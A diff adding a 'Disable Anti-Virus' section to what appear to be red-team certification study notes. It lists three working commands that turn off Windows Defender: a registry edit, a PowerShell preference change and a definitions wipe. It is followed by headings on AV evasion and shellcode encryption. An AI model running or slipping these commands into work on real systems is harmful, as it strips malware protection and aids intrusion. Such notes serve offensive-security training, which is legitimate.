@@ -7,6 +7,23 @@ tags: [C# CRTO REDTEAMING]
 ---
 
 
+#Disbale Anti-Virus
+
+## Disable Windows Defender
+```powershell
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v
+"DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
+```
+or
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+or
+```
+cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
+```
+
 #Anti-Virus Evasion
 
 #Shellcode XOR Encryptor
